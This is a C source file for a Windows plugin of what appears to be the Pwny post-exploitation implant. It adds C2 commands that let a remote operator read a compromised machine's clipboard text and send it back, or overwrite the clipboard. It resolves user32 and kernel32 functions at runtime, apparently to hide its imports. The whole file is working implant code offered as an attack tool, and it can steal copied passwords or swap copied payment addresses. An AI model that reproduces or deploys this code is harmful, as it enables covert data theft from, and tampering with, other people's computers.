/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Clipboard COT plugin — get/set Windows clipboard text.
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>

#include <windows.h>

#define COT_PLUGIN
#include <pwny/tab_cot.h>

/* ------------------------------------------------------------------ */
/* Constants                                                           */
/* ------------------------------------------------------------------ */


#define CLIPBOARD_GET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL)
#define CLIPBOARD_SET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 1)

#define TLV_TYPE_CLIP_DATA \
        TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)

/* ------------------------------------------------------------------ */
/* Win32 typedefs                                                      */
/* ------------------------------------------------------------------ */

typedef BOOL    (WINAPI *fn_OpenClipboard)(HWND);
typedef BOOL    (WINAPI *fn_CloseClipboard)(void);
typedef BOOL    (WINAPI *fn_EmptyClipboard)(void);
typedef HANDLE  (WINAPI *fn_GetClipboardData)(UINT);
typedef HANDLE  (WINAPI *fn_SetClipboardData)(UINT, HANDLE);
typedef HGLOBAL (WINAPI *fn_GlobalAlloc)(UINT, SIZE_T);
typedef LPVOID  (WINAPI *fn_GlobalLock)(HGLOBAL);
typedef BOOL    (WINAPI *fn_GlobalUnlock)(HGLOBAL);

static struct
{
    fn_OpenClipboard    pOpenClipboard;
    fn_CloseClipboard   pCloseClipboard;
    fn_EmptyClipboard   pEmptyClipboard;
    fn_GetClipboardData pGetClipboardData;
    fn_SetClipboardData pSetClipboardData;
    fn_GlobalAlloc      pGlobalAlloc;
    fn_GlobalLock       pGlobalLock;
    fn_GlobalUnlock     pGlobalUnlock;
} w;

/* ------------------------------------------------------------------ */
/* Inline helpers                                                      */
/* ------------------------------------------------------------------ */

static __inline size_t cot_strlen(const char *s)
{
    size_t n = 0;
    while (s[n]) n++;
    return n;
}

static __inline void cot_memcpy(void *dst, const void *src, size_t n)
{
    volatile unsigned char *d = (volatile unsigned char *)dst;
    const unsigned char *s2 = (const unsigned char *)src;
    while (n--) *d++ = *s2++;
}

/* ------------------------------------------------------------------ */
/* Handlers                                                            */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *clipboard_get(c2_t *c2)
{
    tlv_pkt_t *result;
    HANDLE hData;
    char *text;

    if (!w.pOpenClipboard(NULL))
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    hData = w.pGetClipboardData(CF_TEXT);
    if (hData == NULL)
    {
        w.pCloseClipboard();
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    text = (char *)w.pGlobalLock(hData);
    if (text == NULL)
    {
        w.pCloseClipboard();
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_string(result, TLV_TYPE_CLIP_DATA, text);

    w.pGlobalUnlock(hData);
    w.pCloseClipboard();

    return result;
}

static tlv_pkt_t *clipboard_set(c2_t *c2)
{
    char data[65536];
    HGLOBAL hMem;
    char *pMem;
    size_t len;

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_CLIP_DATA, data) <= 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!w.pOpenClipboard(NULL))
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    w.pEmptyClipboard();

    len = cot_strlen(data) + 1;
    hMem = w.pGlobalAlloc(0x0002 /* GMEM_MOVEABLE */, len);
    if (hMem == NULL)
    {
        w.pCloseClipboard();
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    pMem = (char *)w.pGlobalLock(hMem);
    cot_memcpy(pMem, data, len);
    w.pGlobalUnlock(hMem);

    w.pSetClipboardData(CF_TEXT, hMem);
    w.pCloseClipboard();

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

/* ------------------------------------------------------------------ */
/* COT entry                                                           */
/* ------------------------------------------------------------------ */

COT_ENTRY
{
    w.pOpenClipboard    = (fn_OpenClipboard)cot_resolve("user32.dll", "OpenClipboard");
    w.pCloseClipboard   = (fn_CloseClipboard)cot_resolve("user32.dll", "CloseClipboard");
    w.pEmptyClipboard   = (fn_EmptyClipboard)cot_resolve("user32.dll", "EmptyClipboard");
    w.pGetClipboardData = (fn_GetClipboardData)cot_resolve("user32.dll", "GetClipboardData");
    w.pSetClipboardData = (fn_SetClipboardData)cot_resolve("user32.dll", "SetClipboardData");
    w.pGlobalAlloc      = (fn_GlobalAlloc)cot_resolve("kernel32.dll", "GlobalAlloc");
    w.pGlobalLock       = (fn_GlobalLock)cot_resolve("kernel32.dll", "GlobalLock");
    w.pGlobalUnlock     = (fn_GlobalUnlock)cot_resolve("kernel32.dll", "GlobalUnlock");

    api_call_register(api_calls, CLIPBOARD_GET, (api_t)clipboard_get);
    api_call_register(api_calls, CLIPBOARD_SET, (api_t)clipboard_set);
}

#else /* POSIX */

#include <pwny/api.h>
#include <pwny/tab.h>

void register_tab_api_calls(api_calls_t **api_calls)
{
    (void)api_calls;
}

#endif
